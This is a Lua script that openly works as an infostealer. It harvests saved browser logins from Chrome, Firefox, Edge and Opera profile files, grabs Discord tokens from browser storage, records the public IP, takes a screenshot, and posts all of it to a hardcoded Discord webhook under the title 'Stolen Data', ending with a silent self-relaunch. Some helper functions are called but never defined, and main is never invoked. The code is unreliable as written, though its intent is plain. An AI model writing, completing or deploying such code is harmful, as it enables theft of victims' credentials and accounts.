-- Load required libraries
local http = require("socket.http")
local ltn12 = require("ltn12")
local json = require("dkjson")
local sys = require("sys")

-- Function to locate saved logins from browsers
local function getBrowserLogins()
    local logins = {}
    local browsers = {"Chrome", "Firefox", "Edge", "Opera"}

    for _, browser in ipairs(browsers) do
        local path = ""
        if browser == "Chrome" then
            path = os.getenv("LOCALAPPDATA") .. "\\Google\\Chrome\\User Data\\Default\\Login Data"
        elseif browser == "Firefox" then
            path = os.getenv("APPDATA") .. "\\Mozilla\\Firefox\\Profiles\\*.default-release\\logins.json"
        elseif browser == "Edge" then
            path = os.getenv("LOCALAPPDATA") .. "\\Microsoft\\Edge\\User Data\\Default\\Login Data"
        elseif browser == "Opera" then
            path = os.getenv("APPDATA") .. "\\Opera Software\\Opera Stable\\Login Data"
        end

        if path ~= "" then
            local file = io.open(path, "rb")
            if file then
                local content = file:read("*all")
                file:close()
                -- Parse the content and extract logins
                -- This will depend on the format of the login data file for each browser
                -- For simplicity, let's assume we have a function `parseLogins` that does this
                local parsedLogins = parseLogins(content)
                for _, login in ipairs(parsedLogins) do
                    table.insert(logins, {browser = browser, login = login})
                end
            end
        end
    end

    return logins
end

-- Function to get the IP address
local function getIPAddress()
    local response_body = {}
    local res, code, response_headers, status = http.request{
        url = "http://ipinfo.io/ip",
        sink = ltn12.sink.table(response_body)
    }
    if code == 200 then
        return table.concat(response_body)
    else
        return nil
    end
end

-- Function to take a screenshot of the whole screen
local function takeScreenshot()
    -- This function will depend on the operating system and available tools
    -- For Windows, you can use a tool like `nircmd` to take a screenshot
    local command = 'nircmd savescreenshot "screenshot.png" full'
    os.execute(command)
    return "screenshot.png"
end

-- Function to locate Discord token from browser
local function getDiscordTokenFromBrowser()
    local tokens = {}
    local browsers = {"Chrome", "Firefox", "Edge", "Opera"}

    for _, browser in ipairs(browsers) do
        local path = ""
        if browser == "Chrome" then
            path = os.getenv("LOCALAPPDATA") .. "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"
        elseif browser == "Firefox" then
            path = os.getenv("APPDATA") .. "\\Mozilla\\Firefox\\Profiles\\*.default-release\\storage\\default\\https+++discord.com\\idb\\*.sqlite"
        elseif browser == "Edge" then
            path = os.getenv("LOCALAPPDATA") .. "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb"
        elseif browser == "Opera" then
            path = os.getenv("APPDATA") .. "\\Opera Software\\Opera Stable\\Local Storage\\leveldb"
        end

        if path ~= "" then
            -- Read the local storage or cookies and extract tokens
            -- This will require a specific implementation for each browser
            -- For simplicity, let's assume we have a function `extractTokens` that does this
            local extractedTokens = extractTokens(path)
            for _, token in ipairs(extractedTokens) do
                table.insert(tokens, {browser = browser, token = token})
            end
        end
    end

    return tokens
end

-- Function to send data to a Discord webhook
local function sendToDiscordWebhook(webhookUrl, data)
    local response_body = {}
    local res, code, response_headers, status = http.request{
        url = webhookUrl,
        method = "POST",
        headers = {
            ["Content-Type"] = "application/json"
        },
        source = ltn12.source.string(json.encode(data)),
        sink = ltn12.sink.table(response_body)
    }
    if code == 204 then
        return true
    else
        return false
    end
end

-- Main function
local function main()
    local webhookUrl = "https://discordapp.com/api/webhooks/1385334515911753850/Y6Z74wKPZyedljfWeZkbjmApl65IIlASj2hLogoXqR8PZ_PaFJ9GFVEx4K1L0uaS1VsA"

    local logins = getBrowserLogins()
    local ip = getIPAddress()
    local screenshotPath = takeScreenshot()
    local discordTokens = getDiscordTokenFromBrowser()

    local data = {
        embeds = {
            {
                title = "Stolen Data",
                fields = {
                    { name = "Browser Logins", value = json.encode(logins), inline = false },
                    { name = "IP Address", value = ip, inline = true },
                    { name = "Discord Tokens", value = json.encode(discordTokens), inline = false }
                },
                image = {
                    url = "attachment://" .. screenshotPath
                }
            }
        },
        files = {
            {
                name = screenshotPath,
                content = sys.readfile(screenshotPath)
            }
        }
    }

    local success = sendToDiscordWebhook(webhookUrl, data)
    if success then
        print("Data sent successfully!")
    else
        print("Failed to send data.")
    end
end

-- Run the main function silently
os.execute('start "" /b cmd /c "' .. sys.getscriptpath() .. '"')
